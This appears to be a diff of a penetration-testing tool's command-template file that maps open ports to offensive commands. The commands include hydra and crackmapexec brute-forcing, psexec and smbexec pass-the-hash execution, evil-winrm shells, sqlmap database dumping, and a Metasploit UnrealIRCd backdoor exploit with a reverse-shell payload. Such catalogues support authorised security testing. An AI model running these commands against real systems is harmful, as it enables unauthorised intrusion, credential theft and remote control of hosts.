@@ -16,7 +16,7 @@ pattern: nikto
 template: nikto -h http://{host}/
 template: nikto -h http://{host}:{port}/
 condition: ["80", "443", "http", "https"]
-group: HTTP
+group: 80_HTTP
 [end]
 
 [Echidna]
@@ -40,7 +40,7 @@ description: scan shared drive via SMB using smbmap
 template: smbmap -H {host}
 template: smbmap -H {host} -u "{user}" -p "{pass}"
 condition: ["139", "445", "netbios", "microsoft-ds"]
-group: SMB
+group: 445_SMB
 [end]
 
 [Echidna]
@@ -98,7 +98,7 @@ description: connect shared drive via SMB using smbclient
 template: smbclient -L //{host}
 template: smbclient -N //{host}/{SMBDrive}
 condition: ["139", "445", "netbios", "microsoft-ds"]
-group: SMB
+group: 445_SMB
 [end]
 
 [Echidna]
@@ -107,22 +107,38 @@ template: psexec.py {user}:{password}@{host}
 template: psexec.py {domain}/{user}:{password}@{host}
 template: psexec.py {user}@{host} -hashes {passwordhash}
 condition: ["139", "445", "netbios", "microsoft-ds"]
-group: SMB
+group: 445_SMB
+[end]
+
+[Echidna]
+description: smbexec.py will create a new service in the victim machine and use it to execute something.
+template: smbexec.py {user}:{password}@{host}
+template: smbexec.py {domain}/{user}:{password}@{host}
+template: smbexec.py {user}@{host} -hashes {passwordhash}
+condition: ["139", "445", "netbios", "microsoft-ds"]
+group: 445_SMB
 [end]
 
 [Echidna]
 description: crackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. Y
 template: crackmapexec smb {host} -u {user} -p {pass} -x whoami
 template: crackmapexec smb {host} -u {userlistfile} -p {passlistfile}
-condition: ["139", "445", "5985", "5986", "netbios", "microsoft-ds"]
-group: SMB
+condition: ["139", "445", "netbios", "microsoft-ds"]
+group: 445_SMB
 [end]
 
 [Echidna]
 description: crackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. Y
 template: crackmapexec winrm {host} -u {user} -p {pass}
 condition: ["5985", "5986"]
-group: WinRM
+group: 5985_WinRM
+[end]
+
+[Echidna]
+description: crackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. Y
+template: crackmapexec mssql {host} -u {user} -p {pass} -x whoami
+condition: ["1433", "mssql"]
+group: 1433_MSSQL
 [end]
 
 [Echidna]
@@ -165,8 +181,8 @@ template: binary
 template: ascii
 template: mkdir $directoryname
 template: rmdir $directoryname
-condition: ["^(?!.*default).*$", "ftp"]
-group: FTP Command
+condition: ["21", "ftp"]
+group: 21_FTP
 [end]
 
 [Echidna]
@@ -176,7 +192,7 @@ template: ftp ftp://{user}@{host}
 template: ftp anonymous@{host}
 template: ftp {host}
 condition: ["ftp", "21"]
-group: FTP Command
+group: 21_FTP
 [end]
 
 [Echidna]
@@ -192,7 +208,7 @@ template: mysql -u{user} -p{pass} -h {host}
 description: Enumeration using nmap script
 template: nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 {host}
 condition: ["mysql", "3306"]
-group: MYSQL
+group: 3306_MYSQL
 [end]
 
 [Echidna]
@@ -215,7 +231,7 @@ group: Useful Command
 description: sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
 template: sqlmap -u {host} --level=5 --risk=3 --dump-all --data "<parameter_id>=id&<parameter_pass>=pass"
 condition: ["80", "443", "http", "https"]
-group: HTTP
+group: 80_HTTP
 [end]
 
 [Echidna]
@@ -239,22 +255,29 @@ group: Meterpreter Command
 description: cewl is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper
 template: cewl {host} > wordlist.txt
 condition: ["http", "https", "80", "443"]
-group: HTTP
+group: 80_HTTP
 [end]
 
 [Echidna]
 pattern: hydra
 description: Hydra is a parallelized login cracker which supports numerous protocols to attack.
-template: hydra {host} -l user -P $passwordfile$
-template: hydra {host} -l user -P $passwordfile$ {port.name}
-template: hydra {host} -L $userfile$ -P $passwordfile$
-template: hydra {host} -L $userfile$ -P $passwordfile$ {port.name}
-template: hydra {host} -l user -e nsr
-template: hydra {host} -l user -e nsr {port.name}
-template: hydra {host} -L $userfile$ -e nsr
-template: hydra {host} -L $userfile$ -e nsr {port.name}
-condition: ["ftp", "ssh", "http", "https", ""RDP", "21", "22", "80", "443", "3389"]
-group: Bruteforce attack (hydra)
+template: hydra {host} -l {user} -P {passwordfile} ftp
+template: hydra {host} -L {userfile} -P {passwordfile} ftp
+template: hydra {host} -l user -e nsr ftp
+template: hydra {host} -L {userfile} -e nsr ftp
+condition: ["ftp", "21"]
+group: 21_FTP
+[end]
+
+[Echidna]
+pattern: hydra
+description: Hydra is a parallelized login cracker which supports numerous protocols to attack.
+template: hydra {host} -l {user} -P {passwordfile} ssh
+template: hydra {host} -L {userfile} -P {passwordfile} ssh
+template: hydra {host} -l user -e nsr ssh
+template: hydra {host} -L {userfile} -e nsr ssh
+condition: ["ssh", "22"]
+group: 22_SSH
 [end]
 
 [Echidna]
@@ -263,7 +286,7 @@ description: WhatWeb identifies websites. It recognises web technologies includi
 template: whatweb {host}
 template: whatweb {host}:{port}
 condition: ["http", "https", "80", "443"]
-group: HTTP
+group: 80_HTTP
 [end]
 
 [Echidna]
@@ -271,16 +294,15 @@ pattern: smb_version
 description: Scan smb version via metasploit module
 template: msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set rhosts {host}; exploit"
 condition: ["139", "445", "netbios", "microsoft-ds"]
-group: SMB
+group: 445_SMB
 [end]
 
 [Echidna]
-pattern: evin-winrmi
 description: evil-winrmi provides remote shell access to Windows machines over WinRM (Windows Remote Management).
 template: evil-winrm -i {host} -u {user} -H {hash}
 template: evil-winrm -i {host} -u {user} -p {password}
 condition: ["5985", "5986"]
-group: WinRM
+group: 5985_WinRM
 [end]
 
 [Echidna]
@@ -291,7 +313,7 @@ group: Privilege Escalation Command
 [end]
 
 [Echidna]
-description: find out files which have the SUID bit set
+description: find out files which have the SUID bit set. Vim, less, etc is dangerous if the SUID bit set. You can see what files can be abused by this link. https://gtfobins.github.io/
 template: find / -perm -u=s -type f 2>/dev/null
 condition: ["isInitialShellEstablished"]
 group: Privilege Escalation Command
@@ -317,14 +339,14 @@ template: wpscan --url http://{host}/  -f cli-no-colour
 template: wpscan --url http://{host}/  -f cli-no-colour -e at -e ap -e u
 template: wpscan --url http://{host}/ -f cli-no-colour -U $username$ -P $passwordfile$ --force
 condition: ["http", "https", "80", "443"]
-group: HTTP
+group: 80_HTTP
 [end]
 
 [Echidna]
 description: DNS Enumration. Standard Scan
 template: dnsrecon {domain}
 condition: ["53", "dns"]
-group: DNS
+group: 53_HTTP
 [end]
 
 
@@ -332,14 +354,14 @@ group: DNS
 description: checks the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).
 template: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {host}
 condition: ["3389", "RDP"]
-group: RDP
+group: 3389_RDP
 [end]
 
 [Echidna]
 description: The rlogin command enables you to log in to other UNIX machines on your network.
 template: rlogin -l root {host} -p {port}
 condition: ["512", "513", "514"]
-group: RLOGIN
+group: 513_RLOGIN
 [end]
 
 [Echidna]
@@ -350,21 +372,20 @@ template: showmount -a {host}
 description: list all directories
 template: showmount -d {host}
 condition: ["nfs", "2049"]
-group: NFS
+group: 2049_NFS
 [end]
 
 [Echidna]
-description: connect shared drive via nfs using mount
+description: connect shared drive
 template: mount -t nfs {host} /tmp/
 template: mount -t nfs {host}:<remote_folder> /tmp/
 condition: ["nfs", "2049"]
-group: NFS
+group: 2049_NFS
 [end]
 
 [Echidna]
-description: Telnet is a network protocol that gives users a UNsecure way to access a computer over a network.
+description: Telnet is a network protocol that gives users a UNsecure way to access a computer over a network. Use -vn option for banner grabbing
 template: telnet {host} {port}
-description: Use -vn option for banner grabbing
 template: telnet -vn {host} {port}
 group: Useful Command
 [end]
@@ -380,52 +401,63 @@ description: SSH connection command
 template: ssh {host}
 template: ssh {user}@{host}
 condition: ["ssh", "22"]
-group: SSH
+group: 22_SSH
 [end]
 
 [Echidna]
 description: SMTP Version check using metasploit module
 template: msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set rhosts {host}; exploit"
-description: Enumerate service users using nmap module
-template: nmap --script smtp-enum-users -p 25 {host}
 condition: ["SMTP", "25"]
-group: SMTP
+group: 25_SMTP
 [end]
 
 [Echidna]
-description: SMTP Version check using metasploit module
-template: msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set rhosts {host}; exploit"
 description: Enumerate service users using nmap module
 template: nmap --script smtp-enum-users -p 25 {host}
 condition: ["SMTP", "25"]
-group: SMTP
+group: 25_SMTP
 [end]
 
 [Echidna]
-description: Gets you list of ports open using RPC services. list short summary of rpc services
+description: Gets you list of ports open using RPC services. list short summary of rpc services. Try connecting with null session by -U "" option.
 template: rpcinfo -s {host}
-description: list ports of rpc services
-template: rpcinfo -s {host}
-description: try connecting with null session
 template: rpcclient -U "" {host}
 condition: ["rpcbind", "111"]
-group: RPCbind
+group: 111_RPCbind
 [end]
 
 [Echidna]
 description: try to login by root user using metasploit module. password for root user is retured if the attack success.
 template: msfconsole -q -x "use auxiliary/scanner/vnc/vnc_login; set username root; set rhosts {host}; exploit"
+condition: ["vnc", "5900"]
+group: 5900_VNC
+[end]
+
+[Echidna]
 description: launch VNC (Virtual Network Computing) client
 template: vncviewer {host}
 condition: ["vnc", "5900"]
-group: VNC
+group: 5900_VNC
 [end]
 
 [Echidna]
 description: find and scan IRC services using nmap
 template: nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 {host}
+condition: ["irc", "6667"]
+group: 6667_IRC
+[end]
+
+[Echidna]
 description: exploit IRCD service with metasploit (CVE-2010-2075)
 template: msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload cmd/unix/reverse; set lhost {localip}; set rhosts {host}; exploit";
 condition: ["irc", "6667"]
-group: IRC
+group: 6667_IRC
+[end]
+
+[Echidna]
+description: mssqlclient.py is the script from Impacket collection that can be used in order to establish an authenticated connection to a MS SQL Server. If you can login, you may be able to attack by xp_dirtree or NTLM Relay. 
+template: mssqlclient.py [-db volume] {DOMAIN}/{USER}:{PASSWORD}@{host}
+template: mssqlclient.py [-db volume] -windows-auth {DOMAIN}/{USER}:{PASSWORD}@{host}
+condition: ["1433", "mssql"]
+group: 1433_MSSQL
 [end]
